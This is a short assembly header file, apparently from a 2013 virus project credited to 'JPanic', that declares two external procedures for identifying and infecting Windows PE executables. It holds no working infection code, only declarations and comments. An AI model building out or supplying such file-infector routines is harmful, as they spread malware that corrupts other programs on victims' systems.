;= PE Infection Routine Definitions (c) 2013 JPanic =======================
;
; Provides routines for infection and identification of PE executables.
;
; Defined:
;	IsImagePE()
;	InfectPE()
;
;- Procedure Definitions --------------------------------------------------

.model flat
.486

extrn IsImagePE:PROC
extrn InfectPE:PROC

;= END FILE ===============================================================	